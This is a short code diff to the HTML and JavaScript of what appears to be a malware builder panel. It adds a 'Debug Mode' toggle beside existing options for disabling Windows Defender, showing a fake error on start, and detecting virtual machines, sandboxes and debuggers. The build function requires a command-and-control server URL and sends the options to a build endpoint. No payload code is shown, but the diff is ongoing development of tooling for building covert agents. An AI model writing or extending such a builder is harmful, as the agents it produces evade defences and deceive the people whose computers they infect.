@@ -323,6 +323,7 @@
                 <div class="toggle-row"><div><div class="toggle-label">Defender Disable</div><div class="toggle-sub">Windows Defender bypass</div></div><input type="checkbox" id="b-defender"></div>
                 <div class="toggle-row"><div><div class="toggle-label">Fake Error</div><div class="toggle-sub">Show fake error on start</div></div><input type="checkbox" id="b-fakeerr"></div>
                 <div class="toggle-row"><div><div class="toggle-label">Anti-Analysis</div><div class="toggle-sub">VM/Sandbox/Debugger detection</div></div><input type="checkbox" id="b-antianalysis"></div>
+                <div class="toggle-row"><div><div class="toggle-label" style="color:var(--gold)">Debug Mode</div><div class="toggle-sub">Show console with full logs</div></div><input type="checkbox" id="b-debug"></div>
               </div>
             </div>
             <div style="margin-top:24px;display:flex;gap:12px">
@@ -692,6 +693,7 @@ async function buildAgent() {
     disable_defender: document.getElementById('b-defender').checked,
     fake_error: document.getElementById('b-fakeerr').checked,
     anti_analysis: document.getElementById('b-antianalysis').checked,
+    debug: document.getElementById('b-debug').checked,
   };
   if (!opts.server) return alert('C2 Server URL required');
   const r = await apiFetch('/api/panel/build', {
